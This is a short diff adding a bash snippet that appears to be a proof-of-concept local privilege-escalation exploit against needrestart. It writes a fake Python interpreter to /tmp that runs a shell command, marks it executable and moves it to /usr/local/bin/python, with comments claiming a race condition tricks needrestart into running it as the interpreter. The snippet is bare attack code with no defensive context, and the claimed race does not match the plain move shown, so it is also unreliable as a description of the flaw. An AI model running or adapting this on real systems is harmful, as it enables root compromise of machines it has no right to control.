@@ -1,0 +1,9 @@
+```bash
+#!/bin/bash
+# Create a fake Python interpreter that executes arbitrary code
+echo -e '#!/usr/bin/env python3\nimport os; os.system("whoami")' > /tmp/fake_python
+chmod +x /tmp/fake_python
+
+# Use a race condition to trick needrestart into using the fake interpreter
+mv /tmp/fake_python /usr/local/bin/python
+```
